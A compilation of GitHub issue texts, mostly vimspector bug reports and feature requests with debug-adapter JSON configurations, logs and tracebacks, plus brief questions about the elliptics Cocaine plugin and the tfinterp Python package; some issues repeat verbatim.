![image](https://user-images.githubusercontent.com/30050929/70980854-f7ce0200-20ee-11ea-90ed-77f56502039e.png)

<---------->
133667324
1) It seems that the **interiorem/cocaine-plugins/elliptics** is more up to date than 
https://github.com/interiorem/cocaine-plugin-elliptics ?
Which one should we use?

2) In case of yes.
    Is the **interiorem/cocaine-plugins/elliptics** compatible with the **interiorem/elliptics** version of the DB?

<---------->
133874672
Hi,
After I install this package, I try to load in python:

```
from tfinterp import regular_nd
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ImportError: cannot import name 'regular_nd' from 'tfinterp' (/Users/tiantian/Documents/software/tf.interp/tfinterp/__init__.py)
```

Any ideas to fix it? Thanks. Hi,

it looks quite nice what you have here. But is the project still active? And if so, will there be support for the next few years? Hi @dfm,

I'd be keen to use this tool as a dependency for something I am working on. Would you be in a position to release this on pypi and conda-forge?

That would be absolutely amazing.

Cheers,

Simon
<---------->
134156823
Breakpoints can be displayed int he location list, but this is weak and not fully implemented.

We need a breakpoints window to list all breakpoints, allowing:

- move/edit/enable/disable
- view for line and function breakpoints
- etc.

UI wise, it's not obvious where to put this. **Describe the bug**

When a breakpoint is set with no active debug session, the sign appears next to the line (OK). If you then insert lines or delete them, the Vim sign moves around with the line (great!), however, Vimspector doesn't know this has happened, and still thinks the breakpoint is on the (absolute) line number which the user specified, leading to strange results and unexpected breakpoints.

**To Reproduce**

* Open some file
* Go to a line
* Press `<F9>`
* Go up a line and delete it
* Try and disbable the breakpoint, (press `<F9>`)

etc., including start debugging.

**Expected behavior**

Breakpoint is disabled, and/or striggers at the expected line.

**Actual behaviour**

Spurious breakpoint created, break on wrong line, etc. **Describe the bug**

Python attach fails with "Session is not initialised". This appears to be a bug in vscode-cpptools, but requires more investigation. In practice, however, simply attaching directly to the `ptvsd` port works perfectly, so perhaps that should be the recommended approach, i.e.

* Start the application with `python -m ptvsd --host localhost --port 1234 --wait ...`
* Attach to it directly with 

```json
    "python - attach ptvsd": {
      "adapter": {
        "name": "ptvsd",
        "port": 1234
      },
      "configuration": {
        "name": "attach",
        "type": "ptvsd",
        "request": "attach",
        "debugOptions":  [
          "RedirectOutput",
          "UnixClient",
          "ShowReturnValue"
        ]
      }
    }
```

**To Reproduce**

* cd to `support/test/python/simple_python`
* `python -m ptvsd --wait --host localhost --port 1234 test.py`
* In another window, in same directory, set a breakpoint, and fire up vimspector, using the following config:

```json
    "python - attach": {
      "adapter": "vscode-python",
      "variables": [
        {
          "python": {
            "shell": "/bin/bash -c 'if [ -z \"${dollar}VIRTUAL_ENV\" ]; then echo $$(which python); else echo \"${dollar}VIRTUAL_ENV/bin/python\"; fi'"
          }
        }
      ],
      "configuration": {
        "name": "Python attach",
        "type": "vscode-python",
        "request": "attach",

        "pythonPath": "${python}",
        "host": "localhost",
        "port": "${port}"
      }
    },
```

**Expected behavior**

Vimspector starts and attaches to the app

**Actual behaviour**

It never attaches, and the vscode-python node debug adapter spits out an error (which you can see in the console of the `test.py` that the session is not initialized. This is clearly a vscode-python bug and/or incompatibility with ptvsd (it doesn't appear to send a DAP initialise request). **Describe the bug**
A clear and concise description of what the bug is.

After calling `vimspector#Reset()` while debugging a java application using the eclipse.jdt.ls via YouCompleteMe, vimspector never resets. The vim tab remains open and the final messages logged by vimspector indicate the events that fire on exit are never called.

**To Reproduce**
List of steps to reproduce

1. Create an example java project using maven. Configure YouCompleteMe to use the eclipse.jdt.ls to perform completion (and to enable debugging)
1. Download the vscode java debugger extension, place it in your home directory
1. Set the following in your .vimrc: `let g:ycm_java_jdtls_extension_path = [ '<your home dir>/<your vscode extensions directory>/' ]`
1. Drop a breakpoint in a file in the project you desire to debug
1. Call `YcmCompleter ExecuteCommand vscode.java.startDebugSession`
1. Call `vimspector#Launch()`
1. Enter the port provided by YouCompleteMe to start vimspector
1. Once the debugger has attached, call `vimspector#Reset()`

Vimspector config file:

```
{
    "adapters": {
        "java-debug-server": {
            "name": "vscode-java",
            "port": "ask"
        }
    },
    "configurations": {
        "Java Launch": {
            "adapter": "java-debug-server",
            "configuration": {
                "request": "attach",
                "hostName": "localhost",
                "port": "5005",
                "sourcePaths": [ "${workspaceRoot}/**" ],
                "classPaths": [ "${workspaceRoot}/**/target/classes" ],
                "args": "",
                "stopOnEntry": true,
                "console": "integratedTerminal"
            }
        }
    }
}
```

**Expected behavior**
A clear and concise description of what you expected to happen.

I'd expect vimspector to close the tab that was opened when vimspector was launched and for vimspector to be ready to be used again (i.e., calling `vimspector#Launch()` again)

**Actual behaviour**
What actually happened, including output, log files etc.

Please include:
* Vimspector log (~/.vimspector.log)
* Output from any or all UI diagnostic tabs (Server, etc.)

The tab never closes; it remains open and vimspector is never put into a clean slate. If `vimspector#Launch()` is called again, vimspector dumps a bunch of erroneous output. 

I can't dump the entire .vimspector.log here since it contains some work-related information. Here is the relevant information at the end of the file though:

* Note that the contents below do contain all of the output at the end of the log; there is no other output below this

```
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'thread', 'body': {'reason': 'exited', 'threadId': 76, 'type': 'thread'}, 'seq': 395, 'type': 'event'}
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'exited', 'body': {'exitCode': 0, 'type': 'exited'}, 'seq': 396, 'type': 'event'}
2019-10-01 14:52:57,903 - INFO - User Msg: The debugee exited with status code: 0
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'exited', 'body': {'exitCode': 0, 'type': 'exited'}, 'seq': 397, 'type': 'event'}
2019-10-01 14:52:57,904 - INFO - User Msg: The debugee exited with status code: 0
2019-10-01 14:53:01,463 - DEBUG - Stop debug adapter with callback : self._Reset()
2019-10-01 14:53:01,464 - DEBUG - Sending Message: {"command": "disconnect", "arguments": {"terminateDebuggee": true}, "seq": 25, "type": "request"}
2019-10-01 14:53:01,465 - DEBUG - Message received: {'success': True, 'request_seq': 25, 'command': 'disconnect', 'seq': 398, 'type': 'response'}
2019-10-01 14:53:01,465 - DEBUG - Setting server exit handler before disconnect
```

If I call `vimspector#Launch()` again after calling `vimspector#Reset()`, the following output is returned:

```
Error detected while processing function vimspector#Launch:
line    1:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 165, in Start
    self._StartWithConfiguration( configuration, adapter )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 213, in _StartWithConfiguration
    start()
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 181, in start
    self._SetUpUI()
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 363, in _SetUpUI
    vim.current.buffer )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/stack_trace.py", line 33, in __init__
    utils.SetUpScratchBuffer( self._buf, 'vimspector.StackTrace' )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/utils.py", line 88, in SetUpScratchBuffer
    buf.name = name
vim.error: Vim:E95: Buffer with this name already exists
Press ENTER or type command to continue
```
Of course this is due to the buffers never actually being closed when reset is called.

**Environemnt**

NOTE: NeoVim is not supported.
NOTE: Windows is not supported.

* Output of `vim --version`

```
VIM - Vi IMproved 8.1 (2018 May 18, compiled Sep 03 2019 13:04:21)
Included patches: 1-1967
Modified by jonathon.fernyhough@york.ac.uk
Compiled by jonathon.fernyhough@york.ac.uk
Huge version without GUI.  Features included (+) or not (-):
+acl               -farsi             -mouse_sysmouse    -tag_any_white
+arabic            +file_in_path      +mouse_urxvt       -tcl
+autocmd           +find_in_path      +mouse_xterm       +termguicolors
+autochdir         +float             +multi_byte        +terminal
-autoservername    +folding           +multi_lang        +terminfo
-balloon_eval      -footer            -mzscheme          +termresponse
+balloon_eval_term +fork()            +netbeans_intg     +textobjects
-browse            +gettext           +num64             +textprop
++builtin_terms    -hangul_input      +packages          +timers
+byte_offset       +iconv             +path_extra        +title
+channel           +insert_expand     -perl              -toolbar
+cindent           +job               +persistent_undo   +user_commands
-clientserver      +jumplist          +postscript        +vartabs
-clipboard         +keymap            +printer           +vertsplit
+cmdline_compl     +lambda            +profile           +virtualedit
+cmdline_hist      +langmap           -python            +visual
+cmdline_info      +libcall           +python3           +visualextra
+comments          +linebreak         +quickfix          +viminfo
+conceal           +lispindent        +reltime           +vreplace
+cryptv            +listcmds          +rightleft         +wildignore
+cscope            +localmap          -ruby              +wildmenu
+cursorbind        -lua               +scrollbind        +windows
+cursorshape       +menu              +signs             +writebackup
+dialog_con        +mksession         +smartindent       -X11
+diff              +modify_fname      -sound             -xfontset
+digraphs          +mouse             +spell             -xim
-dnd               -mouseshape        +startuptime       -xpm
-ebcdic            +mouse_dec         +statusline        -xsmp
+emacs_tags        +mouse_gpm         -sun_workshop      -xterm_clipboard
+eval              -mouse_jsbterm     +syntax            -xterm_save
+ex_extra          +mouse_netterm     +tag_binary
+extra_search      +mouse_sgr         -tag_old_static
   system vimrc file: "$VIM/vimrc"
     user vimrc file: "$HOME/.vimrc"
 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
       defaults file: "$VIMRUNTIME/defaults.vim"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H   -Wdate-time  -g -O2 -fdebug-prefix-map=/build/vim-I6gBP8/vim-8.1.1967=. -fstack-protector-strong -Wformat -Werror=format-security -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1
Linking: gcc   -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl     -L/usr/lib/python3.6/config-3.6m-x86_64-linux-gnu -lpython3.6m -lpthread -ldl -lutil -lm
```

* Output of `which vim`:

```
/usr/bin/vim
```

* Output of `:py3 pass`:

This isn't printing anything in my Vim version for whatever reason.

* Operating system: <linux or macOS> and version

Ubuntu 16.04 

**Additional context**
Add any other context about the problem here.
 I'm sorry for the issues bombard, I was just thinking that these are different topics to discuss so I didn't want to put them all in one big issue.

So today, after some debug sessions with vimspector, I noticed that the stdout/stderr window of my running program is being recreated every time I start a debug session. I must say that it's kind of annoying to quit the old window every time a new session is started. I'm also a Neovim refugee because of #30 and so I'm not used yet to Vim's `:terminal`s which makes this process a little bit harder for me TBH.. So today, when I've started my first ever debug session I was asked:

```
Enable exception filter 'Raised Exceptions'? (Y/N)
Enable exception filter 'Uncaught Exceptions'? (Y/N)
When to break on exception?
1: never
2: always
3: unhandled
4: userHandled
Type number and <Enter> or click with mouse (empty cancels):
```

And only then the debugging has started. Is it possible to make give these answers default answers for the whole project / adapter / all adapters? Say I don't understand what are these questions all about, where could I find a documentation for it? **Describe the bug**
When running install_gadget script with option `--force-enable-chrome`. Script print `install_gadget.py: error: unrecognized arguments: --force-enable-chrome`.

**To Reproduce**
Run install_gadget script with option `--force-enable-chrome`.

Vimspector config file:

```
{
  "adapters": {
      "lldb-mi": {
        "name": "lldb-mi",
        "command": [
          "node",
          "$HOME/.vscode/extensions/webfreak.debug-0.22.0/out/src/lldb.js"
        ]
      },
      "cppdbg": {
        "name": "cppdbg",
        "command": [ "$HOME/.vscode/extensions/ms-vscode.cpptools-0.20.1/debugAdapters/OpenDebugAD7" ],
        "attach": {
          "pidProperty": "processId",
          "pidSelect": "ask"
        }
      },
      "python": {
        "name": "python",
        "command": [
          "node",
          "$HOME/.vscode/extensions/ms-python.python-2018.4.0/out/client/debugger/Main.js"
        ]
      },
      "bashdb": {
        "name": "bashdb",
        "command": [
          "node",
          "$HOME/.vscode/extensions/rogalmic.bash-debug-0.2.0/out/bashDebug.js"
        ]
      },
      "lldb": {
        "name": "lldb",
        "command": [
          "lldb",
          "-b",
          "-O",
          "command script import '$HOME/.vscode/extensions/vadimcn.vscode-lldb-0.8.7/adapter'",
          "-O",
          "script adapter.main.run_stdio_session()"
        ]
      }
  },
  "configurations": {
    "simple_c_program - lldb-mi Launch": {
      "adapter": "lldb-mi",
      "configuration": {
        "request": "launch",
        "target": "support/test/cpp/simple_c_program/test",
        "args": [],
        "cwd": ".",
        "lldbmipath": "$HOME/.vscode/extensions/ms-vscode.cpptools-0.20.1/debugAdapters/lldb/bin/lldb-mi",
        "trace": true,
        "logFilePath": "$HOME/.vimspector.protocol.log"
      }
    },
    "simple_c_progra - ms Launch": {
      "adapter": "cppdbg",
      "configuration": {
        "name": "ms Launch",
        "type": "cppdbg",
        "request": "launch",
        "program": "${workspaceRoot}/support/test/cpp/simple_c_program/test",
        "args": [],
        "cwd": "$HOME",
        "environment": [],
        "externalConsole": true,
        "MIMode": "lldb"
      }
    },
    "simple_python - launch": {
      "adapter": "python",
      "configuration": {
        "name": "Python: Current File",
        "type": "python",
        "request": "launch",
        "cwd": "${workspaceRoot}/support/test/python/simple_python",
        "stopOnEntry": true,
        "console": "externalTerminal",
        "debugOptions": [],
        "program": "${workspaceRoot}/support/test/python/simple_python/main.py"
      }
    },
    "simple_c_program - MS Attach": {
      "adapter": "cppdbg",
      "configuration": {
        "name": "(lldb) Attach",
        "type": "cppdbg",
        "request": "attach",
        "program": "${workspaceRoot}/support/test/cpp/simple_c_program/test",
        "MIMode": "lldb"
      }
    },
    "bashdb": {
      "adapter": "bashdb",
      "configuration": {
        "type": "bashdb",
        "request": "launch",
        "name": "Bash-Debug (simplest configuration)",
        "program": "$HOME/.vim/bundle/YouCompleteMe/install.sh",
        "args": [],
        "cwd": "$HOME/.vim/bundle/YouCompleteMe",
        "pathBash": "bash",
        "pathBashdb": "bashdb",
        "pathCat": "cat",
        "pathMkfifo": "mkfifo",
        "pathPkill": "pkill",
        "showDebugOutput": true,
        "trace": true
      }
    },
    "lldb launch": {
      "adapter": "lldb",
      "configuration": {
        "type": "lldb",
        "request": "launch",
        "name": "LLDB: Launch",
        "program": "$HOME/Development/vim/src/vim",
        "args": [],
        "cwd": "$HOME/Development/vim"
      }
    },
    "racerd": {
      "adapter": "lldb",
      "configuration": {
        "type": "lldb",
        "request": "launch",
        "name": "LLDB: Launch",
        "program": "$HOME/.vim/bundle/YouCompleteMe/third_party/ycmd/third_party/racerd/target/debug/racerd",
        "args": [
          "serve",
          "--port=12345",
          "--secret-file=secretfile"
        ],
        "cwd": "$HOME/.vim/bundle/YouCompleteMe/third_party/ycmd"
      }
    }
  }
}
```

**Expected behavior**
I would expect the script to install the chrome debugger gadget

**Actual behaviour**
```
OS = linux
gadget_dir = /home/quentin/.vim/pack/default/start/vimspector/gadgets/linux
usage: install_gadget.py [-h] [--all] [--force-all] [--enable-c] [--disable-c]
                         [--enable-python] [--disable-python] [--enable-tcl]
                         [--disable-tcl] [--force-enable-csharp]
                         [--enable-bash] [--disable-bash] [--enable-go]
                         [--disable-go] [--force-enable-node]
                         [--force-enable-typescript]
install_gadget.py: error: unrecognized arguments: --force-enable-chrome
```

**Environemnt**

* Output of `vim --version`

```
VIM - Vi IMproved 8.1 (2018 May 18, compiled Sep 29 2019 22:27:49)
Included patches: 1-2102
Compiled by Arch Linux
Huge version with GTK3 GUI.  Features included (+) or not (-):
+acl               -farsi             -mouse_sysmouse    -tag_any_white
+arabic            +file_in_path      +mouse_urxvt       +tcl/dyn
+autocmd           +find_in_path      +mouse_xterm       +termguicolors
+autochdir         +float             +multi_byte        +terminal
-autoservername    +folding           +multi_lang        +terminfo
+balloon_eval      -footer            -mzscheme          +termresponse
+balloon_eval_term +fork()            +netbeans_intg     +textobjects
+browse            +gettext           +num64             +textprop
++builtin_terms    -hangul_input      +packages          +timers
+byte_offset       +iconv             +path_extra        +title
+channel           +insert_expand     +perl/dyn          +toolbar
+cindent           +job               +persistent_undo   +user_commands
+clientserver      +jumplist          +postscript        +vartabs
+clipboard         +keymap            +printer           +vertsplit
+cmdline_compl     +lambda            +profile           +virtualedit
+cmdline_hist      +langmap           +python/dyn        +visual
+cmdline_info      +libcall           +python3/dyn       +visualextra
+comments          +linebreak         +quickfix          +viminfo
+conceal           +lispindent        +reltime           +vreplace
+cryptv            +listcmds          +rightleft         +wildignore
+cscope            +localmap          +ruby/dyn          +wildmenu
+cursorbind        +lua/dyn           +scrollbind        +windows
+cursorshape       +menu              +signs             +writebackup
+dialog_con_gui    +mksession         +smartindent       +X11
+diff              +modify_fname      +sound             -xfontset
+digraphs          +mouse             +spell             +xim
+dnd               +mouseshape        +startuptime       -xpm
-ebcdic            +mouse_dec         +statusline        +xsmp_interact
+emacs_tags        +mouse_gpm         -sun_workshop      +xterm_clipboard
+eval              -mouse_jsbterm     +syntax            -xterm_save
+ex_extra          +mouse_netterm     +tag_binary        
+extra_search      +mouse_sgr         -tag_old_static    
   system vimrc file: "/etc/vimrc"
     user vimrc file: "$HOME/.vimrc"
 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
  system gvimrc file: "/etc/gvimrc"
    user gvimrc file: "$HOME/.gvimrc"
2nd user gvimrc file: "~/.vim/gvimrc"
       defaults file: "$VIMRUNTIME/defaults.vim"
    system menu file: "$VIMRUNTIME/menu.vim"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H -DFEAT_GUI_GTK  -I/usr/include/gtk-3.0 -I/usr/include/pango-1.0 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/lib/libffi-3.2.1/include -I/usr/include/harfbuzz -I/usr/include/fribidi -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/cairo -I/usr/include/pixman-1 -I/usr/include/gdk-pixbuf-2.0 -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/gio-unix-2.0 -I/usr/include/libdrm -I/usr/include/atk-1.0 -I/usr/include/at-spi2-atk/2.0 -I/usr/include/at-spi-2.0 -I/usr/include/dbus-1.0 -I/usr/lib/dbus-1.0/include -pthread  -D_FORTIFY_SOURCE=2  -march=x86-64 -mtune=generic -O2 -pipe -fno-plt -D_REENTRANT  -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1       
Linking: gcc   -L. -Wl,-O1,--sort-common,--as-needed,-z,relro,-z,now -fstack-protector-strong -rdynamic -Wl,-export-dynamic -Wl,-E -Wl,-rpath,/usr/lib/perl5/5.30/core_perl/CORE  -Wl,-O1,--sort-common,--as-needed,-z,relro,-z,now -L/usr/local/lib -Wl,--as-needed -o vim   -lgtk-3 -lgdk-3 -lz -lpangocairo-1.0 -lpango-1.0 -lharfbuzz -latk-1.0 -lcairo-gobject -lcairo -lgdk_pixbuf-2.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0  -lSM -lICE -lXt -lX11 -lXdmcp -lSM -lICE  -lm -ltinfo -lelf -lnsl    -lcanberra  -lacl -lattr -lgpm -ldl   -Wl,-E -Wl,-rpath,/usr/lib/perl5/5.30/core_perl/CORE -Wl,-O1,--sort-common,--as-needed,-z,relro,-z,now -fstack-protector-strong -L/usr/local/lib  -L/usr/lib/perl5/5.30/core_perl/CORE -lperl -lpthread -ldl -lm -lcrypt -lutil -lc   -L/usr/lib -ltclstub8.6 -ldl -lz -lpthread -lm
```

* Output of `which vim`:

```
/usr/bin/vim
```

* Output of `:py3 pass`:

```
paste here
```

* Operating system: linux 5.3

**Additional context**
I fixed the problem by using the `--force-enable-typescript`.

Then i got an error saying that the downloaded content wasn't a tar archive.

I fixed the problem by changing the url of the typescript gadget.

Know my `.gadgets.json looks like this` :

```
{
  "adapters": {
    "chrome": {
      "command": [
        "node",
        "${gadgetDir}/debugger-for-chrome/out/src/chromeDebug.js"
      ],
      "name": "debugger-for-chrome",
      "type": "chrome"
    }
  }
}
```

And the debugger doesn't launch without any errors.

After taking a look a the extracted archive i found that `chromeDebug.js` doesn't exist, instead there is a `chromeDebug.ts` file.

I suppose that i must compile those typescript files to js with tsc/ **Is your feature request related to a problem? Please describe.**

So today, when I've started my first ever debug session I was asked:

```
Enable exception filter 'Raised Exceptions'? (Y/N)
Enable exception filter 'Uncaught Exceptions'? (Y/N)
When to break on exception?
1: never
2: always
3: unhandled
4: userHandled
Type number and <Enter> or click with mouse (empty cancels):
```

And only then the debugging has started. Is it possible to make give these answers default answers for the whole project / adapter / all adapters? Say I don't understand what are these questions all about, where could I find a documentation for it?



**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.
 I'm sorry for the issues bombard, I was just thinking that these are different topics to discuss so I didn't want to put them all in one big issue.

So today, after some debug sessions with vimspector, I noticed that the stdout/stderr window of my running program is being recreated every time I start a debug session. I must say that it's kind of annoying to quit the old window every time a new session is started. I'm also a Neovim refugee because of #30 and so I'm not used yet to Vim's `:terminal`s which makes this process a little bit harder for me TBH.. Vimspector supports some fairly powerful remote debugging features, as required by the author. These options are not documented and there is no tutorial. It would be very useful to see which variables change between steps. For example lldb's TUI highlights those with red:

![variables](https://user-images.githubusercontent.com/717109/69503709-3e33a500-0f25-11ea-99c4-485a4e0baecc.gif)
 **Describe the bug**

When a breakpoint is set with no active debug session, the sign appears next to the line (OK). If you then insert lines or delete them, the Vim sign moves around with the line (great!), however, Vimspector doesn't know this has happened, and still thinks the breakpoint is on the (absolute) line number which the user specified, leading to strange results and unexpected breakpoints.

**To Reproduce**

* Open some file
* Go to a line
* Press `<F9>`
* Go up a line and delete it
* Try and disbable the breakpoint, (press `<F9>`)

etc., including start debugging.

**Expected behavior**

Breakpoint is disabled, and/or striggers at the expected line.

**Actual behaviour**

Spurious breakpoint created, break on wrong line, etc. There's a test framework but no real tests.

Add some tests, at least:

* Start up and debug a C program
* Setting/clearing breakpoints
* Reset - hopefully will get a repro of the frequent vim crashes
* Restart - I keep breaking this one.

etc. _If you will excuse me not completing the template, this is a rather more vague request for information_

In a tools session at  GopherCon 2019 ([notes](https://docs.google.com/document/d/1-RVyttQ0ncjCpR_sRwizf-Ubedkr0Emwmk2LhnsUOmE/edit#heading=h.4a2ftcuzucfc)) there was an interesting discussion started about Delve and the Debugger Adapter Protocol. Delve has become the de facto debugger for Go, and it looks like it will be blessed as the official debugger by the Go team. 

As part of trying to understand how Delve can become better integrated in various editors, the Debugger Adapter Protocol was brought up. Delve does not currently speak this protocol, but if there is sufficient support the work could be done (relatively easily). 

I've previously seen this project, but it was this discussion that prompted me to raise an issue:

* what are your thoughts/experience of the Debugger Adapter Protocol?
* do you have any advice on how to proceed on the question of how to integrate Delve with Vim (and other editors)
* ...

The context of considering the Debugger Adapter Protocol is the Go now has an official LSP server, `gopls`. Hence, building on that success, it seems logical to consider the Debugger Adapter Protocol.

Thanks in advance **Describe the solution you'd like**
This is the issue to discuss what we need to do to support [PowerShell Editor Services](https://github.com/PowerShell/PowerShellEditorServices) PowerShell's language server and debug adapter.

**Additional context**
PowerShell Editor Services uses Named Pipes/unix domain sockets for the communication layer. This is because we typically have the LSP and DAP being used at the same time.

In vscode, we bridge stdio to the named pipes using [this TypeScript file](https://github.com/PowerShell/vscode-powershell/blob/master/src/debugAdapter.ts) which acts as the "entry point" or "executable" for vscode. 

I think we can leverage this as well for vimspector.

My ideal situation is to start PowerShell Editor Services up with either [coc-powershell](https://github.com/coc-extensions/coc-powershell) or YCM (which I'd love guidance on :)) and then connect to that using vimspector.

What do you think? :smile:  I'd be interested in adding C# support with the new Samsung debugger: https://github.com/Samsung/netcoredbg

I know there were discussions about it using the Microsoft vsdbg, but that didn't go anywhere because of licensing issues.

@puremourning do you know anything about this? I feel like I saw a pr or something that added that support and I was trying to find that to go off of, but use the Samsung debugger instead.
 `README.md` links to C-demo and Python-demo (I assume, gifs). The links for those demos are broken. **Describe the bug**
A clear and concise description of what the bug is.

After calling `vimspector#Reset()` while debugging a java application using the eclipse.jdt.ls via YouCompleteMe, vimspector never resets. The vim tab remains open and the final messages logged by vimspector indicate the events that fire on exit are never called.

**To Reproduce**
List of steps to reproduce

1. Create an example java project using maven. Configure YouCompleteMe to use the eclipse.jdt.ls to perform completion (and to enable debugging)
1. Download the vscode java debugger extension, place it in your home directory
1. Set the following in your .vimrc: `let g:ycm_java_jdtls_extension_path = [ '<your home dir>/<your vscode extensions directory>/' ]`
1. Drop a breakpoint in a file in the project you desire to debug
1. Call `YcmCompleter ExecuteCommand vscode.java.startDebugSession`
1. Call `vimspector#Launch()`
1. Enter the port provided by YouCompleteMe to start vimspector
1. Once the debugger has attached, call `vimspector#Reset()`

Vimspector config file:

```
{
    "adapters": {
        "java-debug-server": {
            "name": "vscode-java",
            "port": "ask"
        }
    },
    "configurations": {
        "Java Launch": {
            "adapter": "java-debug-server",
            "configuration": {
                "request": "attach",
                "hostName": "localhost",
                "port": "5005",
                "sourcePaths": [ "${workspaceRoot}/**" ],
                "classPaths": [ "${workspaceRoot}/**/target/classes" ],
                "args": "",
                "stopOnEntry": true,
                "console": "integratedTerminal"
            }
        }
    }
}
```

**Expected behavior**
A clear and concise description of what you expected to happen.

I'd expect vimspector to close the tab that was opened when vimspector was launched and for vimspector to be ready to be used again (i.e., calling `vimspector#Launch()` again)

**Actual behaviour**
What actually happened, including output, log files etc.

Please include:
* Vimspector log (~/.vimspector.log)
* Output from any or all UI diagnostic tabs (Server, etc.)

The tab never closes; it remains open and vimspector is never put into a clean slate. If `vimspector#Launch()` is called again, vimspector dumps a bunch of erroneous output. 

I can't dump the entire .vimspector.log here since it contains some work-related information. Here is the relevant information at the end of the file though:

* Note that the contents below do contain all of the output at the end of the log; there is no other output below this

```
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'thread', 'body': {'reason': 'exited', 'threadId': 76, 'type': 'thread'}, 'seq': 395, 'type': 'event'}
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'exited', 'body': {'exitCode': 0, 'type': 'exited'}, 'seq': 396, 'type': 'event'}
2019-10-01 14:52:57,903 - INFO - User Msg: The debugee exited with status code: 0
2019-10-01 14:52:57,903 - DEBUG - Message received: {'event': 'exited', 'body': {'exitCode': 0, 'type': 'exited'}, 'seq': 397, 'type': 'event'}
2019-10-01 14:52:57,904 - INFO - User Msg: The debugee exited with status code: 0
2019-10-01 14:53:01,463 - DEBUG - Stop debug adapter with callback : self._Reset()
2019-10-01 14:53:01,464 - DEBUG - Sending Message: {"command": "disconnect", "arguments": {"terminateDebuggee": true}, "seq": 25, "type": "request"}
2019-10-01 14:53:01,465 - DEBUG - Message received: {'success': True, 'request_seq': 25, 'command': 'disconnect', 'seq': 398, 'type': 'response'}
2019-10-01 14:53:01,465 - DEBUG - Setting server exit handler before disconnect
```

If I call `vimspector#Launch()` again after calling `vimspector#Reset()`, the following output is returned:

```
Error detected while processing function vimspector#Launch:
line    1:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 165, in Start
    self._StartWithConfiguration( configuration, adapter )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 213, in _StartWithConfiguration
    start()
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 181, in start
    self._SetUpUI()
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/debug_session.py", line 363, in _SetUpUI
    vim.current.buffer )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/stack_trace.py", line 33, in __init__
    utils.SetUpScratchBuffer( self._buf, 'vimspector.StackTrace' )
  File "/home/devynmapes/.vim/pack/my-plugins/start/vimspector/python3/vimspector/utils.py", line 88, in SetUpScratchBuffer
    buf.name = name
vim.error: Vim:E95: Buffer with this name already exists
Press ENTER or type command to continue
```
Of course this is due to the buffers never actually being closed when reset is called.

**Environemnt**

NOTE: NeoVim is not supported.
NOTE: Windows is not supported.

* Output of `vim --version`

```
VIM - Vi IMproved 8.1 (2018 May 18, compiled Sep 03 2019 13:04:21)
Included patches: 1-1967
Modified by jonathon.fernyhough@york.ac.uk
Compiled by jonathon.fernyhough@york.ac.uk
Huge version without GUI.  Features included (+) or not (-):
+acl               -farsi             -mouse_sysmouse    -tag_any_white
+arabic            +file_in_path      +mouse_urxvt       -tcl
+autocmd           +find_in_path      +mouse_xterm       +termguicolors
+autochdir         +float             +multi_byte        +terminal
-autoservername    +folding           +multi_lang        +terminfo
-balloon_eval      -footer            -mzscheme          +termresponse
+balloon_eval_term +fork()            +netbeans_intg     +textobjects
-browse            +gettext           +num64             +textprop
++builtin_terms    -hangul_input      +packages          +timers
+byte_offset       +iconv             +path_extra        +title
+channel           +insert_expand     -perl              -toolbar
+cindent           +job               +persistent_undo   +user_commands
-clientserver      +jumplist          +postscript        +vartabs
-clipboard         +keymap            +printer           +vertsplit
+cmdline_compl     +lambda            +profile           +virtualedit
+cmdline_hist      +langmap           -python            +visual
+cmdline_info      +libcall           +python3           +visualextra
+comments          +linebreak         +quickfix          +viminfo
+conceal           +lispindent        +reltime           +vreplace
+cryptv            +listcmds          +rightleft         +wildignore
+cscope            +localmap          -ruby              +wildmenu
+cursorbind        -lua               +scrollbind        +windows
+cursorshape       +menu              +signs             +writebackup
+dialog_con        +mksession         +smartindent       -X11
+diff              +modify_fname      -sound             -xfontset
+digraphs          +mouse             +spell             -xim
-dnd               -mouseshape        +startuptime       -xpm
-ebcdic            +mouse_dec         +statusline        -xsmp
+emacs_tags        +mouse_gpm         -sun_workshop      -xterm_clipboard
+eval              -mouse_jsbterm     +syntax            -xterm_save
+ex_extra          +mouse_netterm     +tag_binary
+extra_search      +mouse_sgr         -tag_old_static
   system vimrc file: "$VIM/vimrc"
     user vimrc file: "$HOME/.vimrc"
